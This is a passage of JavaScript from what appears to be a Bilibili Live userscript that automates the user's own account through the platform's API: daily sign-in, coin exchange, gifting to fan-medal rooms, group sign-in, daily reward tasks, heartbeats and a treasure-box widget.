			.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = 0;

		    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER === undefined) config.AUTO_DAILYREWARD_CONFIG
			.COIN_CONFIG.NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG
			.NUMBER;
		    config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = parseInt(config.AUTO_DAILYREWARD_CONFIG
										 .COIN_CONFIG.NUMBER, 10);
		    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER < 0) config.AUTO_DAILYREWARD_CONFIG
			.COIN_CONFIG.NUMBER = 0;
		    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_QUEUE_SIZE < 0) config.AUTO_LOTTERY_CONFIG
			.STORM_CONFIG.STORM_QUEUE_SIZE = 1;
		    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT < 0) config.AUTO_LOTTERY_CONFIG
			.STORM_CONFIG.STORM_MAX_COUNT = 0;
		    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT < 0) config.AUTO_LOTTERY_CONFIG
			.STORM_CONFIG.STORM_ONE_LIMIT = 1;
		    if ($.type(CONFIG.AUTO_GIFT_CONFIG.ROOMID) != 'array') {
			CONFIG.AUTO_GIFT_CONFIG.ROOMID = [0];
		    }
		    if ($.type(CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID) != 'array') {
			CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID = [0];
		    }
		    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL === undefined) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL =
			Essential.Config.AUTO_GIFT_CONFIG.GIFT_INTERVAL;
		    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL < 1) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL =
			1;
		    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT === undefined) config.AUTO_GIFT_CONFIG.GIFT_LIMIT =
			Essential.Config.AUTO_GIFT_CONFIG.GIFT_LIMIT;
		    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT < 0) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = 86400;
		    if (config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE === undefined) config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE =
			Essential.Config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE;
		    if (config.DD_BP === undefined) config.DD_BP = Essential.Config.DD_BP;
		    if (config.DD_DM_STORM === undefined) config.DD_DM_STORM = Essential.Config.DD_DM_STORM;
		    return config;
		},
		_copy: (obj) => {
		    return JSON.parse(JSON.stringify(obj));
		},
		load: () => {
		    try {
			CONFIG = JSON.parse(localStorage.getItem(`${NAME}_CONFIG`)) || {};
			CONFIG = Essential.Config.fix(CONFIG);
			if (Object.prototype.toString.call(CONFIG) !== '[object Object]') throw new Error();
		    } catch (e) {
			CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
		    }
		    Essential.Config.recurLoad(CONFIG);
		    DEBUG('Essential.Config.load: CONFIG', CONFIG);
		    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
		    BiliPushUtils.Check.sleepTimeRangeBuild();
		},
		save: () => {
		    CONFIG = Essential.Config.recurSave(CONFIG);
		    CONFIG = Essential.Config.fix(CONFIG);
		    Essential.DataSync.down();
		    DEBUG('Essential.Config.save: CONFIG', CONFIG);
		    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
		    window.toast('设置已保存，部分设置需要刷新后生效', 'success');
		},
		clear: () => {
		    CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
		    Essential.DataSync.down();
		    localStorage.removeItem(`${NAME}_CONFIG`);
		}
	    }, // Need Init After Toast.init and AlertDialog.init
	    Cache: {
		load: () => {
		    try {
			CACHE = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
			if (Object.prototype.toString.call(CACHE) !== '[object Object]') throw new Error();
			if (CACHE.version !== VERSION) {
			    CACHE.version = VERSION;
			    //Essential.Cache.clear();
			}
		    } catch (err) {
			CACHE = {
			    version: VERSION
			};
			localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
		    }
		    DEBUG('Essential.Cache.load: CACHE', CACHE);
		},
		save: () => {
		    localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
		},
		clear: () => {
		    CACHE = {
			version: VERSION
		    };
		    Essential.DataSync.down();
		    localStorage.removeItem(`${NAME}_CACHE`);
		}
	    },
	    DataSync: {
		init: () => {
		    window[NAME] = {};
		    window[NAME].iframeSet = new Set();
		},
		down: () => {
		    try {
			window[NAME].Info = Info;
			window[NAME].CONFIG = CONFIG;
			window[NAME].CACHE = CACHE;
			for (const iframe of window[NAME].iframeSet) {
			    if (iframe.promise.down) iframe.promise.down.resolve();
			}
		    } catch (err) {}
		}
	    }
	}; // Only Run in MainScript, Need Init after Toast.init

	const Sign = {
	    run: () => {
		try {
		    if (!CONFIG.AUTO_SIGN) return $.Deferred().resolve();
		    if (CACHE.sign_ts && !checkNewDay(CACHE.sign_ts)) {
			// 同一天，不再检查签到
			runTomorrow(Sign.run);
			return $.Deferred().resolve();
		    }
		    return API.sign.doSign().then((response) => {
			DEBUG('Sign.run: API.sign.doSign', response);
			if (response.code === 0) {
			    // 签到成功
			    window.toast(`[自动签到]${response.data.text}`, 'success');
			    CACHE.sign_ts = ts_ms();
			    Essential.Cache.save();
			} else if (response.code === -500 || response.message.indexOf('已') > -1) {
			    // 今天已签到过
			} else {
			    window.toast(`[自动签到]${response.data.text}`, 'caution');
			    return Sign.run();
			}
			runTomorrow(Sign.run);
		    }, () => {
			window.toast('[自动签到]签到失败，请检查网络', 'error');
			return delayCall(() => Sign.run());
		    });
		} catch (err) {
		    window.toast('[自动签到]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every day

	const Exchange = {
	    run: () => {
		try {
		    if (!CONFIG.SILVER2COIN) return $.Deferred().resolve();
		    if (CACHE.exchange_ts && !checkNewDay(CACHE.exchange_ts)) {
			// 同一天，不再兑换硬币
			runTomorrow(Exchange.run);
			return $.Deferred().resolve();
		    }
		    return Exchange.silver2coin().then(() => {
			CACHE.exchange_ts = ts_ms();
			Essential.Cache.save();
			runTomorrow(Exchange.run);
		    }, () => delayCall(() => Exchange.run()));
		} catch (err) {
		    window.toast('[银瓜子换硬币]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    },
	    silver2coin: () => {
		return API.Exchange.silver2coin().then((response) => {
		    DEBUG('Exchange.silver2coin: API.SilverCoinExchange.silver2coin', response);
		    if (response.code === 0) {
			// 兑换成功
			window.toast(`[银瓜子换硬币]${response.msg}`, 'success');
		    } else if (response.code === 403) {
			// 每天最多能兑换 1 个
			// 银瓜子余额不足
			// window.toast(`[银瓜子换硬币]'${response.msg}`, 'info');
		    } else {
			window.toast(`[银瓜子换硬币]${response.msg}`, 'caution');
		    }
		}, () => {
		    window.toast('[银瓜子换硬币]兑换失败，请检查网络', 'error');
		    return delayCall(() => Exchange.silver2coin());
		});
	    }
	}; // Once Run every day

	const Gift = {
	    interval: 600e3,
	    run_timer: undefined,
	    over: false,
	    light_gift: 30607,
	    getMedalList: async () => {
		try {
		    let medal_list = [],
			curPage = 1,
			totalpages = 0;
		    do {
			let response = await API.i.medal(curPage, 25);
			DEBUG('Gift.getMedalList: API.i.medal', response);
			medal_list = medal_list.concat(response.data.fansMedalList);
			curPage = response.data.pageinfo.curPage;
			totalpages = response.data.pageinfo.totalpages;
			curPage++;
		    } while (curPage < totalpages);
		    return medal_list;
		} catch (e) {
		    window.toast('[自动送礼]获取勋章列表失败，请检查网络', 'error');
		    return await delayCall(() => Gift.getMedalList());
		}
	    },
	    getBagList: async () => {
		try {
		    let response = await API.gift.bag_list();
		    DEBUG('Gift.getBagList: API.gift.bag_list', response);
		    Gift.time = response.data.time;
		    return response.data.list;
		} catch (e) {
		    window.toast('[自动送礼]获取包裹列表失败，请检查网络', 'error');
		    return await delayCall(() => Gift.getBagList());
		}
	    },
	    getFeedByGiftID: (gift_id) => {
		for (let i = Info.gift_list.length - 1; i >= 0; --i) {
		    if (Info.gift_list[i].id === gift_id) {
			return Math.ceil(Info.gift_list[i].price / 100);
		    }
		}
		return 0;
	    },
	    sort_medals: (medals) => {
		if (CONFIG.AUTO_GIFT_CONFIG.GIFT_SORT) {
		    medals.sort((a, b) => {
			if (b.level - a.level == 0) {
			    return b.intimacy - a.intimacy;
			}
			return b.level - a.level;
		    });
		} else {
		    medals.sort((a, b) => {
			if (a.level - b.level == 0) {
			    return a.intimacy - b.intimacy;
			}
			return a.level - b.level;
		    });
		}
		if (CONFIG.AUTO_GIFT_CONFIG.ROOMID && CONFIG.AUTO_GIFT_CONFIG.ROOMID.length > 0) {
		    let sortRooms = CONFIG.AUTO_GIFT_CONFIG.ROOMID;
		    sortRooms.reverse();
		    for (let froom of sortRooms) {
			let rindex = medals.findIndex(r => r.roomid == froom);
			if (rindex != -1) {
			    let tmp = medals[rindex];
			    medals.splice(rindex, 1);
			    medals.unshift(tmp);
			}
		    }
		}
		return medals;
	    },
	    auto_light: async (medal_list) => {
		try {
		    const feed = Gift.getFeedByGiftID(Gift.light_gift);
		    let noLightMedals = medal_list.filter(it => it.is_lighted == 0 && it.day_limit - it.today_feed >=
							  feed && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(exp => exp == it.roomid) ==
							  -1);
		    if (noLightMedals && noLightMedals.length > 0) {
			noLightMedals = Gift.sort_medals(noLightMedals);
			let bag_list = await Gift.getBagList();
			let heartBags = bag_list.filter(r => r.gift_id == Gift.light_gift);
			if (heartBags && heartBags.length > 0) {
			    for (let medal of noLightMedals) {
				let gift = heartBags.find(it => it.gift_id == Gift.light_gift && it.gift_num >
							  0);
				if (gift) {
				    let remain_feed = medal.day_limit - medal.today_feed;
				    if (remain_feed - feed >= 0) {
					let response = await API.room.room_init(parseInt(medal.roomid, 10));
					let send_room_id = parseInt(response.data.room_id, 10);
					let feed_num = 1;
					let rsp = await API.gift.bag_send(Info.uid, gift.gift_id, medal.target_id,
									  feed_num, gift.bag_id, send_room_id, Info.rnd)
					if (rsp.code === 0) {
					    gift.gift_num -= feed_num;
					    medal.today_feed += feed_num * feed;
					    remain_feed -= feed_num * feed;
					    window.toast(
						`[自动送礼]勋章[${medal.medalName}] 点亮成功，送出${feed_num}个${gift.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${remain_feed}]`,
						'success');
					} else {
					    window.toast(`[自动送礼]勋章[${medal.medalName}] 点亮异常:${rsp.msg}`,
							 'caution');
					}
				    }
				    continue;
				}
				break;
			    }
			}
		    }
		} catch (e) {
		    console.error(e);
		    window.toast(`[自动送礼]点亮勋章 检查出错:${e}`, 'error');
		}
	    },
	    run: async () => {
		const func = () => {
		    window.toast('[自动送礼]送礼失败，请检查网络', 'error');
		    return delayCall(() => Gift.run());
		};
		try {
		    if (!CONFIG.AUTO_GIFT) return;
		    if (Gift.run_timer) clearTimeout(Gift.run_timer);
		    Gift.interval = CONFIG.AUTO_GIFT_CONFIG.GIFT_INTERVAL * 60e3;
		    if (CACHE.gift_ts) {
			const diff = ts_ms() - CACHE.gift_ts;
			if (diff < Gift.interval) {
			    Gift.run_timer = setTimeout(Gift.run, Gift.interval - diff);
			    return;
			}
		    }
		    Gift.over = false;
		    let medal_list = await Gift.getMedalList();
		    if (CONFIG.AUTO_GIFT_CONFIG.AUTO_LIGHT) {
			await Gift.auto_light(medal_list);
		    }
		    DEBUG('Gift.run: Gift.getMedalList().then: Gift.medal_list', medal_list);
		    if (medal_list && medal_list.length > 0) {
			medal_list = medal_list.filter(it => it.day_limit - it.today_feed > 0 && it.level <
						       20);
			medal_list = Gift.sort_medals(medal_list);
			if (CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID
			    .length > 0) {
			    medal_list = medal_list.filter(r => CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(
				exp => exp == r.roomid) == -1);
			}
			let bag_list = await Gift.getBagList();
			for (let v of medal_list) {
			    if (Gift.over) break;
			    let remain_feed = v.day_limit - v.today_feed;
			    if (remain_feed > 0) {
				let now = ts_s();
				if (!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL) {
				    //送之前查一次有没有可送的
				    let pass = bag_list.filter(r => ![4, 3, 9, 10].includes(r.gift_id) && r
							       .gift_num > 0 && r.expire_at > now && (r.expire_at - now <
												      CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT));
				    if (pass.length == 0) {
					break;
				    } else {
					bag_list = pass;
				    }
				}
				window.toast(
				    `[自动送礼]勋章[${v.medalName}] 今日亲密度未满[${v.today_feed}/${v.day_limit}]，预计需要[${remain_feed}]送礼开始`,
				    'info');
				await Gift.sendGift(v, bag_list);
			    } else {
				window.toast(`[自动送礼]勋章[${v.medalName}] 今日亲密度已满`, 'info');
			    }
			}
			CACHE.gift_ts = ts_ms();
			Essential.Cache.save();
		    }
		    await delayCall(() => Gift.run(), Gift.interval);
		} catch (err) {
		    func();
		    window.toast('[自动送礼]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		}
	    },
	    sendGift: async (medal, bag_list = []) => {
		if (Gift.time <= 0) Gift.time = ts_s();
		let ruid = medal.target_id;
		let remain_feed = medal.day_limit - medal.today_feed;
		if (remain_feed <= 0) {
		    window.toast(`[自动送礼]勋章[${medal.medalName}] 今日亲密度已满`, 'info');
		    return;
		}
		let response = await API.room.room_init(parseInt(medal.roomid, 10));
		let room_id = parseInt(response.data.room_id, 10);
		if (bag_list.length == 0) {
		    bag_list = await Gift.getBagList();
		}
		let now = ts_s();
		if (!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL) {
		    //送之前查一次有没有可送的
		    let pass = bag_list.filter(r => ![4, 3, 9, 10].includes(r.gift_id) && r.gift_num > 0 &&
					       r.expire_at > now && (r.expire_at - now < CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT));
		    if (pass.length == 0) {
			Gift.over = true;
			return;
		    } else {
			bag_list = pass;
		    }
		}
		for (const v of bag_list) {
		    if (remain_feed <= 0) {
			window.toast(
			    `[自动送礼]勋章[${medal.medalName}] 送礼结束，今日亲密度已满[${medal.today_feed}/${medal.day_limit}]`,
			    'info');
			return;
		    }
		    if ((
			//特殊礼物排除
			(![4, 3, 9, 10].includes(v.gift_id)
			 //满足到期时间
			 &&
			 v.expire_at > Gift.time && (v.expire_at - Gift.time < CONFIG.AUTO_GIFT_CONFIG
						     .GIFT_LIMIT)
			)
			//或者全部送满
			||
			CONFIG.AUTO_GIFT_CONFIG.SEND_ALL)
			//永久礼物不自动送
			&&
			v.expire_at > Gift.time) {
			// 检查SEND_ALL和礼物到期时间 送当天到期的
			const feed = Gift.getFeedByGiftID(v.gift_id);
			if (feed > 0) {
			    let feed_num = Math.floor(remain_feed / feed);
			    if (feed_num > v.gift_num) feed_num = v.gift_num;
			    if (feed_num > 0) {
				try {
				    let response = await API.gift.bag_send(Info.uid, v.gift_id, ruid,
									   feed_num, v.bag_id, room_id, Info.rnd);
				    DEBUG('Gift.sendGift: API.gift.bag_send', response);
				    if (response.code === 0) {
					v.gift_num -= feed_num;
					medal.today_feed += feed_num * feed;
					remain_feed -= feed_num * feed;
					window.toast(
					    `[自动送礼]勋章[${medal.medalName}] 送礼成功，送出${feed_num}个${v.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${remain_feed}]`,
					    'success');
				    } else {
					window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼异常:${response.msg}`,
						     'caution');
				    }
				} catch (e) {
				    window.toast('[自动送礼]包裹送礼失败，请检查网络', 'error');
				    return await delayCall(() => Gift.sendGift(medal));
				}
			    }
			}
		    }
		}
	    }
	}; // Once Run every 10 minutes

	const GroupSign = {
	    runHour:9,
	    getGroups: () => {
		return API.Group.my_groups().then((response) => {
		    DEBUG('GroupSign.getGroups: API.Group.my_groups', response);
		    if (response.code === 0) return $.Deferred().resolve(response.data.list);
		    window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
		    return $.Deferred().reject();
		}, () => {
		    window.toast('[自动应援团签到]获取应援团列表失败，请检查网络', 'error');
		    return delayCall(() => GroupSign.getGroups());
		});
	    },
	    signInList:async(list) => {
		//if (i >= list.length) return $.Deferred().resolve();
		try{
		    for(let obj of list){
			let errorCount = 0;
			//自己不能给自己的应援团应援
			if (obj.owner_uid == Info.uid) continue;
			do{
			    try{
				let response = await API.Group.sign_in(obj.group_id, obj.owner_uid);
				DEBUG('GroupSign.signInList: API.Group.sign_in', response);
				if (response.code === 0) {
				    if (response.data.add_num > 0) {
					window.toast(
					    `[自动应援团签到]应援团(group_id=${obj.group_id},owner_uid=${obj.owner_uid})签到成功，当前勋章亲密度+${response.data.add_num}`,
					    'success');
					break;
				    } else if (response.data.status === 1) {
					break;
				    }
				    errorCount++;
				} else {
				    errorCount++;
				    window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
				}
			    }catch(e){
				errorCount++;
			    }
			}while(errorCount<3);
		    }
		}
		catch(e){
		    return delayCall(() => GroupSign.signInList(list));
		}
	    },
	    run: () => {
		try {
		    if (!CONFIG.AUTO_GROUP_SIGN) return $.Deferred().resolve();
		    if (CACHE.group_sign_ts && !checkNewDay(CACHE.group_sign_ts)) {
			// 同一天，不再检查应援团签到
			runTomorrow(GroupSign.run,GroupSign.runHour);
			return $.Deferred().resolve();
		    }
		    let now = new Date();
		    let limit = new Date().setHours(GroupSign.runHour,0,0,0) - now;
		    if(limit>0){
			setTimeout(GroupSign.run,limit);
			return $.Deferred().resolve();
		    }
		    return GroupSign.getGroups().then((list) => {
			return GroupSign.signInList(list).then(() => {
			    CACHE.group_sign_ts = ts_ms();
			    runTomorrow(GroupSign.run,GroupSign.runHour);
			}, () => delayCall(() => GroupSign.run()));
		    }, () => delayCall(() => GroupSign.run()));
		} catch (err) {
		    window.toast('[自动应援团签到]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every day 9 hours "api.live.bilibili.com"
	const DailyReward = {
	    coin_exp: 0,
	    login: () => {
		return API.DailyReward.login().then(() => {
		    DEBUG('DailyReward.login: API.DailyReward.login');
		    window.toast('[自动每日奖励][每日登录]完成', 'success');
		}, () => {
		    window.toast('[自动每日奖励][每日登录]完成失败，请检查网络', 'error');
		    return delayCall(() => DailyReward.login());
		});
	    },
	    watch: (aid, cid) => {
		if (!CONFIG.AUTO_DAILYREWARD_CONFIG.WATCH) return $.Deferred().resolve();
		return API.DailyReward.watch(aid, cid, Info.uid, ts_s()).then((response) => {
		    DEBUG('DailyReward.watch: API.DailyReward.watch', response);
		    if (response.code === 0) {
			window.toast(`[自动每日奖励][每日观看]完成(av=${aid})`, 'success');
		    } else {
			window.toast(`[自动每日奖励][每日观看]'${response.msg}`, 'caution');
		    }
		}, () => {
		    window.toast('[自动每日奖励][每日观看]完成失败，请检查网络', 'error');
		    return delayCall(() => DailyReward.watch(aid, cid));
		});
	    },
	    coin: (cards, n, i = 0, one = false) => {
		if (!CONFIG.AUTO_DAILYREWARD_CONFIG.COIN) return $.Deferred().resolve();
		if (DailyReward.coin_exp >= CONFIG.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER * 10) {
		    window.toast('[自动每日奖励][每日投币]今日投币已完成', 'info');
		    return $.Deferred().resolve();
		}
		if (i >= cards.length) {
		    window.toast('[自动每日奖励][每日投币]动态里可投币的视频不足', 'caution');
		    return $.Deferred().resolve();
		}
		const obj = JSON.parse(cards[i].card);
		let num = Math.min(2, n);
		if (one) num = 1;
		return API.DailyReward.coin(obj.aid, num).then((response) => {
		    DEBUG('DailyReward.coin: API.DailyReward.coin', response);
		    if (response.code === 0) {
			DailyReward.coin_exp += num * 10;
			window.toast(`[自动每日奖励][每日投币]投币成功(av=${obj.aid},num=${num})`, 'success');
			return DailyReward.coin(cards, n - num, i + 1);
		    } else if (response.code === -110) {
			window.toast('[自动每日奖励][每日投币]未绑定手机，已停止', 'error');
			return $.Deferred().reject();
		    } else if (response.code === 34003) {
			// 非法的投币数量
			if (one) return DailyReward.coin(cards, n, i + 1);
			return DailyReward.coin(cards, n, i, true);
		    } else if (response.code === 34005) {
			// 塞满啦！先看看库存吧~
			return DailyReward.coin(cards, n, i + 1);
		    }
		    window.toast(`[自动每日奖励][每日投币]'${response.msg}`, 'caution');
		    return DailyReward.coin(cards, n, i + 1);
		}, () => delayCall(() => DailyReward.coin(cards, n, i)));
	    },
	    share: (aid) => {
		if (!CONFIG.AUTO_DAILYREWARD_CONFIG.SHARE) return $.Deferred().resolve();
		return API.DailyReward.share(aid).then((response) => {
		    DEBUG('DailyReward.share: API.DailyReward.share', response);
		    if (response.code === 0) {
			window.toast(`[自动每日奖励][每日分享]分享成功(av=${aid})`, 'success');
		    } else if (response.code === 71000) {
			// 重复分享
			window.toast('[自动每日奖励][每日分享]今日分享已完成', 'info');
		    } else {
			window.toast(`[自动每日奖励][每日分享]'${response.msg}`, 'caution');
		    }
		}, () => {
		    window.toast('[自动每日奖励][每日分享]分享失败，请检查网络', 'error');
		    return delayCall(() => DailyReward.share(aid));
		});
	    },
	    dynamic: () => {
		return API.dynamic_svr.dynamic_new(Info.uid, 8).then((response) => {
		    DEBUG('DailyReward.dynamic: API.dynamic_svr.dynamic_new', response);
		    if (response.code === 0) {
			if (response.data.cards[0]) {
			    const obj = JSON.parse(response.data.cards[0].card);
			    const p1 = DailyReward.watch(obj.aid, obj.cid);
			    const p2 = DailyReward.coin(response.data.cards, Math.max(CONFIG.AUTO_DAILYREWARD_CONFIG
										      .COIN_CONFIG.NUMBER - DailyReward.coin_exp / 10, 0));
			    const p3 = DailyReward.share(obj.aid);
			    return $.when(p1, p2, p3);
			} else {
			    window.toast('[自动每日奖励]"动态-投稿视频"中暂无动态', 'info');
			}
		    } else {
			window.toast(`[自动每日奖励]获取"动态-投稿视频"'${response.msg}`, 'caution');
		    }
		}, () => {
		    window.toast('[自动每日奖励]获取"动态-投稿视频"失败，请检查网络', 'error');
		    return delayCall(() => DailyReward.dynamic());
		});
	    },
	    run: () => {
		try {
		    if (!CONFIG.AUTO_DAILYREWARD) return $.Deferred().resolve();
		    if (CACHE.dailyreward_ts && !checkNewDay(CACHE.dailyreward_ts)) {
			// 同一天，不执行每日任务
			runTomorrow(DailyReward.run);
			return $.Deferred().resolve();
		    }
		    return API.DailyReward.exp().then((response) => {
			DEBUG('DailyReward.run: API.DailyReward.exp', response);
			if (response.code === 0) {
			    DailyReward.coin_exp = response.number;
			    DailyReward.login();
			    return DailyReward.dynamic().then(() => {
				CACHE.dailyreward_ts = ts_ms();
				runTomorrow(DailyReward.run);
			    });
			} else {
			    window.toast(`[自动每日奖励]${response.message}`, 'caution');
			}
		    }, () => {
			window.toast('[自动每日奖励]获取每日奖励信息失败，请检查网络', 'error');
			return delayCall(() => DailyReward.run());
		    });
		} catch (err) {
		    window.toast('[自动每日奖励]运行时出现异常', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every day "api.live.bilibili.com"
	const Task = {
	    interval: 600e3,
	    double_watch_task: false,
	    run_timer: undefined,
	    MobileHeartbeat: false,
	    PCHeartbeat: false,
	    run: async () => {
		try {
		    if (!CONFIG.AUTO_TASK) return $.Deferred().resolve();
		    if (!Info.mobile_verify) {
			window.toast('[自动完成任务]未绑定手机，已停止', 'caution');
			return $.Deferred().resolve();
		    }
		    if (Task.run_timer) clearTimeout(Task.run_timer);
		    if (CACHE.task_ts && !Task.MobileHeartbeat && !Task.PCHeartbeat) {
			const diff = ts_ms() - CACHE.task_ts;
			if (diff < Task.interval) {
			    Task.run_timer = setTimeout(Task.run, Task.interval - diff);
			    return $.Deferred().resolve();
			}
		    }
		    if (Task.MobileHeartbeat) Task.MobileHeartbeat = false;
		    if (Task.PCHeartbeat) Task.PCHeartbeat = false;
		    return API.i.taskInfo().then(async (response) => {
			DEBUG('Task.run: API.i.taskInfo', response);
			for (const key in response.data) {
			    if (typeof response.data[key] === 'object') {
				if (response.data[key].task_id && response.data[key].status ===
				    1) {
				    await Task.receiveAward(response.data[key].task_id);
				} else if (response.data[key].task_id === 'double_watch_task') {
				    if (response.data[key].status === 0) {
					Task.double_watch_task = false;
					if (Token && TokenUtil && Info.appToken && !Task.double_watch_task) {
					    await BiliPushUtils.API.Heart.mobile_info();
					}
				    } else if (response.data[key].status === 2) {
					Task.double_watch_task = true;
				    } else {
					Task.double_watch_task = false;
				    }
				}
			    }
			}
		    }).always(() => {
			CACHE.task_ts = ts_ms();
			localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
			Task.run_timer = setTimeout(Task.run, Task.interval);
		    }, () => delayCall(() => Task.run()));
		} catch (err) {
		    window.toast('[自动完成任务]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    },
	    receiveAward: async (task_id) => {
		return API.activity.receive_award(task_id).then((response) => {
		    DEBUG('Task.receiveAward: API.activity.receive_award', response);
		    if (response.code === 0) {
			// 完成任务
			window.toast(`[自动完成任务]完成任务：${task_id}`, 'success');
			if (task_id === 'double_watch_task') Task.double_watch_task = true;
		    } else if (response.code === -400) {
			// 奖励已领取
			// window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'info');
		    } else {
			window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'caution');
		    }
		}, () => {
		    window.toast('[自动完成任务]完成任务失败，请检查网络', 'error');
		    return delayCall(() => Task.receiveAward(task_id));
		});
	    }
	}; // Once Run every 10 minutes
	const MobileHeartbeat = {
	    run_timer: undefined,
	    run: async () => {
		try {
		    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
		    if (Task.double_watch_task) return $.Deferred().resolve();
		    if (MobileHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
			Task.MobileHeartbeat = true;
			Task.run();
		    }
		    if (MobileHeartbeat.run_timer) clearTimeout(MobileHeartbeat.run_timer);
		    //API.HeartBeat.mobile
		    BiliPushUtils.API.Heart.mobile().then((rsp) => {
			DEBUG('MobileHeartbeat.run: API.HeartBeat.mobile');
			MobileHeartbeat.run_timer = setTimeout(MobileHeartbeat.run, 300e3);
		    }, () => delayCall(() => MobileHeartbeat.run()));
		} catch (err) {
		    window.toast('[移动端心跳]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every 5mins
	const WebHeartbeat = {
	    run_timer: undefined,
	    run: () => {
		try {
		    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
		    if (WebHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
			Task.WebHeartbeat = true;
			Task.run();
		    }
		    if (WebHeartbeat.run_timer) clearTimeout(WebHeartbeat.run_timer);
		    API.HeartBeat.web().then(() => {
			DEBUG('MobileHeartbeat.run: API.HeartBeat.web');
			WebHeartbeat.run_timer = setTimeout(WebHeartbeat.run, 300e3);
		    }, () => delayCall(() => WebHeartbeat.run()));
		} catch (err) {
		    window.toast('[WEB端心跳]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every 5mins

	const TreasureBox = {
	    timer: undefined,
	    time_end: undefined,
	    time_start: undefined,
	    promise: {
		calc: undefined,
		timer: undefined
	    },
	    DOM: {
		image: undefined,
		canvas: undefined,
		div_tip: undefined,
		div_timer: undefined
	    },
	    init: () => {
		if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().resolve();
		const p = $.Deferred();
		runUntilSucceed(() => {
		    try {
			if ($('.draw-box.gift-left-part').length) {
			    window.toast('[自动领取瓜子]当前直播间有实物抽奖，暂停领瓜子功能', 'caution');
			    p.resolve();
			    return true;
			}
			let treasure_box = $('#gift-control-vm div.treasure-box.p-relative');
			if (!treasure_box.length) return false;
			treasure_box = treasure_box.first();
			treasure_box.attr('id', 'old_treasure_box');
			treasure_box.hide();
			const div = $(
			    `<div id="${NAME}_treasure_div" class="treasure-box p-relative" style="min-width: 46px;display: inline-block;float: left;padding: 22px 0 0 15px;"></div>`
			);
		TreasureBox.DOM.div_tip = $(
		    `<div id="${NAME}_treasure_div_tip" class="t-center b-box none-select">自动<br>领取中</div>`
			);
		TreasureBox.DOM.div_timer = $(
		    `<div id="${NAME}_treasure_div_timer" class="t-center b-box none-select">0</div>`
			);
		TreasureBox.DOM.image = $(
		    `<img id="${NAME}_treasure_image" style="display:none">`);
		TreasureBox.DOM.canvas = $(
		    `<canvas id="${NAME}_treasure_canvas" style="display:none" height="40" width="120"></canvas>`
			);
		const css_text =
		      'min-width: 40px;padding: 2px 3px;margin-top: 3px;font-size: 12px;color: #fff;background-color: rgba(0,0,0,.5);border-radius: 10px;';
		TreasureBox.DOM.div_tip[0].style = css_text;
		TreasureBox.DOM.div_timer[0].style = css_text;
		div.append(TreasureBox.DOM.div_tip);
		div.append(TreasureBox.DOM.image);
		div.append(TreasureBox.DOM.canvas);
